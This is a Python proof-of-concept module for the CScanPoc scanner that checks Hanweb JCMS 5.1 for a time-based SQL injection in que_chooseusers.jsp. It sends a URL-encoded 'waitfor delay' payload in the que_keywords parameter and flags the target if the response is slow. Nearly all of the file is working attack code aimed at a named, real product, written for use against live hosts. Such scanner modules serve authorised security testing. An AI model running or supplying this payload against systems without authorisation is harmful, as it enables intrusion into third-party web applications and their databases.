# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'JCMS_0006'  # 平台漏洞编号，留空
    name = '大汉版通JCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-2'  # 漏洞公布时间
    desc = '''
        /jcms/m_5_1/que_chooseusers.jsp?que_usergroupid=1 存在SQL注入漏洞的文件。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=76816'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS 5.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '082a0d1e-2f1b-4390-8643-5ee3a66418a7'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            ture_url = '{target}'.format(
                target=self.target)+'/jcms/m_5_1/que_chooseusers.jsp?que_keywords=1'
            start_time1 = time.time()
            code1, head1, body1, errcode1, fina_url1 = hh.http(ture_url)
            ture_time = time.time()-start_time1

            flase_url = '{target}'.format(
                target=self.target)+'/jcms/m_5_1/que_chooseusers.jsp?que_keywords=1%27%29%20waitfor%20delay%20%270%3A0%3A5%27%20--'
            start_time2 = time.time()
            code2, head2, body2, errcode2, fina_url2 = hh.http(flase_url)
            flase_time = time.time()-start_time2
            if code1 == 200 and code2 == 200 and flase_time > ture_time and flase_time > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
